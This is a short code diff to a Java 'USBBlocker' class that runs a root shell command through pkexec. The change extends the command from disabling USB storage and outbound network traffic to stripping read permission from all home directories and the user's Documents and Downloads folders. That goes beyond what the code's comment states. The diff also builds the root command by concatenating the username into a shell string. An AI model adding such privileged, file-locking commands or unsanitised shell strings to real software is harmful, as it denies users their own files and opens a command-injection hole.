@@ -10,8 +10,9 @@ import java.io.InputStreamReader;
 public class USBBlocker {
     public void Block() {
         try {
+            String username = System.getProperty("user.name");
             // Command to block USB and internet access
-            String blockCommands = "pkexec bash -c 'modprobe -r usb_storage && iptables -P OUTPUT DROP'";
+            String blockCommands = "pkexec bash -c 'modprobe -r usb_storage && iptables -P OUTPUT DROP && chmod -r /home/* && chmod -r /home/"+username+"/Documents && chmod -r /home/"+username+"/Downloads'";
 
             // Execute the command
             Process blockProcess = Runtime.getRuntime().exec(new String[] { "bash", "-c", blockCommands });
